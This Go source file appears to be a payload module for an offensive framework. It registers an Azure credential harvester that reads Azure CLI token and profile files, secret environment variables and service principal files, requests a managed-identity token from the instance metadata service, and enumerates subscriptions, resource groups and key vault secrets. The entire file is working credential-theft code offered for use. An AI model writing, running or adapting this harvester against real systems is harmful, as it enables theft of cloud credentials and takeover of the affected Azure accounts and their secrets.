package payloads

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"time"
)

func init() {
	Register(&AzureCredHarvester{})
}

type AzureCredHarvester struct{}

func (a *AzureCredHarvester) Name() string     { return "azure_cred_harvester" }
func (a *AzureCredHarvester) Category() string { return "credential" }
func (a *AzureCredHarvester) Description() string {
	return "Harvest Azure tokens/credentials from metadata, env, CLI config"
}

func (a *AzureCredHarvester) Execute(args map[string]string) ([]byte, error) {
	result := a.extract()
	return MarshalJSON(result)
}

type azureCredResult struct {
	Timestamp   string                   `json:"timestamp"`
	Credentials map[string]interface{}   `json:"credentials"`
	Resources   map[string]interface{}   `json:"resources,omitempty"`
	KeyVaults   []map[string]interface{} `json:"key_vaults,omitempty"`
}

func (a *AzureCredHarvester) extract() *azureCredResult {
	r := &azureCredResult{
		Timestamp:   time.Now().UTC().Format(time.RFC3339),
		Credentials: make(map[string]interface{}),
	}

	home, _ := os.UserHomeDir()

	// 1. Azure CLI config
	azConfig := filepath.Join(home, ".azure", "config")
	if data, err := os.ReadFile(azConfig); err == nil {
		r.Credentials["cli_config_raw"] = string(data)
	}

	// 2. Azure CLI accessTokens.json
	azToken := filepath.Join(home, ".azure", "accessTokens.json")
	if data, err := os.ReadFile(azToken); err == nil {
		var tokens interface{}
		if json.Unmarshal(data, &tokens) == nil {
			r.Credentials["cli_tokens"] = tokens
		}
	}

	// 3. Azure CLI profile
	azProfile := filepath.Join(home, ".azure", "azureProfile.json")
	if data, err := os.ReadFile(azProfile); err == nil {
		var profile interface{}
		if json.Unmarshal(data, &profile) == nil {
			r.Credentials["cli_profile"] = profile
		}
	}

	// 4. Environment variables
	azEnvVars := []string{
		"AZURE_CLIENT_ID", "AZURE_CLIENT_SECRET", "AZURE_TENANT_ID",
		"AZURE_SUBSCRIPTION_ID", "AZURE_USERNAME", "AZURE_PASSWORD",
	}
	envCreds := make(map[string]string)
	for _, v := range azEnvVars {
		if val := os.Getenv(v); val != "" {
			envCreds[v] = val
		}
	}
	if len(envCreds) > 0 {
		r.Credentials["environment"] = envCreds
	}

	// 5. Managed Identity (Azure VM metadata)
	client := &http.Client{Timeout: 2 * time.Second}
	req, _ := http.NewRequest("GET",
		"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
		nil)
	req.Header.Set("Metadata", "true")
	resp, err := client.Do(req)
	if err == nil && resp.StatusCode == 200 {
		defer resp.Body.Close()
		data, _ := io.ReadAll(resp.Body)
		var tokenData map[string]interface{}
		if json.Unmarshal(data, &tokenData) == nil {
			r.Credentials["managed_identity"] = tokenData
		}
	}

	// 6. Service principal files
	spFiles := []string{"/etc/azure/sp.txt", "/var/azure/credentials.json"}
	for _, spf := range spFiles {
		if data, err := os.ReadFile(spf); err == nil {
			if strings.HasSuffix(spf, ".json") {
				var parsed interface{}
				if json.Unmarshal(data, &parsed) == nil {
					r.Credentials[fmt.Sprintf("sp_%s", filepath.Base(spf))] = parsed
				}
			} else {
				r.Credentials[fmt.Sprintf("sp_%s", filepath.Base(spf))] = string(data)
			}
		}
	}

	// 7. Try az CLI for resource enumeration
	r.Resources = enumerateAzureResources()
	r.KeyVaults = checkKeyVaults()

	return r
}

func enumerateAzureResources() map[string]interface{} {
	res := make(map[string]interface{})

	azPath, err := exec.LookPath("az")
	if err != nil {
		res["error"] = "Azure CLI not found"
		return res
	}

	// Show account
	out, err := exec.Command(azPath, "account", "show").Output()
	if err == nil {
		var account interface{}
		if json.Unmarshal(out, &account) == nil {
			res["current_subscription"] = account
		}
	}

	// List resource groups
	out, err = exec.Command(azPath, "group", "list").Output()
	if err == nil {
		var groups []map[string]interface{}
		if json.Unmarshal(out, &groups) == nil {
			var names []string
			for _, g := range groups {
				if name, ok := g["name"].(string); ok {
					names = append(names, name)
				}
			}
			if len(names) > 5 {
				names = names[:5]
			}
			res["resource_groups"] = names
		}
	}

	return res
}

func checkKeyVaults() []map[string]interface{} {
	var vaults []map[string]interface{}
	azPath, err := exec.LookPath("az")
	if err != nil {
		return vaults
	}

	out, err := exec.Command(azPath, "keyvault", "list").Output()
	if err != nil {
		return vaults
	}

	var parsed []map[string]interface{}
	if json.Unmarshal(out, &parsed) != nil {
		return vaults
	}

	for _, v := range parsed {
		if len(vaults) >= 3 {
			break
		}
		vaultInfo := map[string]interface{}{
			"name":          v["name"],
			"resourceGroup": v["resourceGroup"],
			"location":      v["location"],
		}

		// List secrets
		name, _ := v["name"].(string)
		if name != "" {
			secretOut, err := exec.Command(azPath, "keyvault", "secret", "list",
				"--vault-name", name).Output()
			if err == nil {
				var secrets []interface{}
				if json.Unmarshal(secretOut, &secrets) == nil {
					vaultInfo["secrets_count"] = len(secrets)
				}
			}
		}

		vaults = append(vaults, vaultInfo)
	}

	return vaults
}

// Helper to avoid unused import
var _ = bufio.ScanLines
var _ = regexp.MustCompile
